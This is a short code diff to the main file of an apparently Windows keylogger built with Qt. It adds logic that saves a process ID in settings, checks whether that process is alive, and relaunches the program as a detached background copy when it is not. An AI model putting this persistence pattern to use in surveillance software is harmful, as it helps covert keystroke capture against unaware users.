@@ -3,18 +3,34 @@
 #include <QCoreApplication>
 #include <QDebug>
 #include <QProcess>
+#include <QSettings>
 #include <QString>
 #include <QStringList>
+
+#include <windows.h>
 
 #include "constants.h"
 #include "keylogger.h"
 
+bool isProcessRunning(DWORD pid)
+{
+    HANDLE process = OpenProcess(SYNCHRONIZE, FALSE, pid);
+    DWORD ret = WaitForSingleObject(process, 0);
+    CloseHandle(process);
+    return ret == WAIT_TIMEOUT;
+}
+
 int main(int argc, char *argv[])
 {
     QCoreApplication app(argc, argv);
-    QCoreApplication::setApplicationVersion(SOFTWARE_VERSION);
+    QCoreApplication::setOrganizationName(ORGANIZATION_DOMAIN);
+    QCoreApplication::setOrganizationDomain(ORGANIZATION_DOMAIN);
+    QCoreApplication::setApplicationName(APPLICATION_NAME);
+    QCoreApplication::setApplicationVersion(APPLICATION_VERSION);
 
+    QSettings settings;
     QCommandLineParser parser;
+
     parser.addHelpOption();
     parser.addVersionOption();
 
@@ -71,12 +87,17 @@ int main(int argc, char *argv[])
 
     parser.process(app);
 
-    if (parser.isSet(initOption)) {
+    QVariant data = settings.value("pid");
+    DWORD pid = static_cast<DWORD>(data.toInt());
+
+    if (!isProcessRunning(pid)) {
         qint64 pid;
         QProcess process;
 
         process.setProgram(QCoreApplication::applicationFilePath());
         process.startDetached(&pid);
+
+        settings.setValue("pid", pid);
 
         return 0;
     }
